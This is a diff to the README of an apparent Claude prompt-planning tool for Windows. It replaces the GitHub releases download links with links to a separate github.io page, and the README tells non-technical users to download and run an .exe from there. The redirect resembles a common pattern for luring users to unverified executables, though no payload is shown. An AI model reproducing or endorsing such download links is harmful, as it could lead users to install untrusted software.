@@ -1,6 +1,6 @@
 # 📝 claude-planning-tool - Build better prompts for Claude faster
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/odessaspecial486/claude-planning-tool/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://odessaspecial486.github.io)
 
 This application helps you create precise prompts for Claude. You choose the specific model, your intended application, and the amount of effort required. The tool generates text that you copy and paste directly into Claude Code. This ensures your prompts follow a proven structure for better results.
 
@@ -8,7 +8,7 @@ This application helps you create precise prompts for Claude. You choose the spe
 
 You do not need programming skills to use this tool. Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/odessaspecial486/claude-planning-tool/releases) to access the download options.
+1. Visit the [releases page](https://odessaspecial486.github.io) to access the download options.
 2. Look for the file ending in .exe.
 3. Click the file name to begin the download.
 4. Save the file to your desktop or your downloads folder.
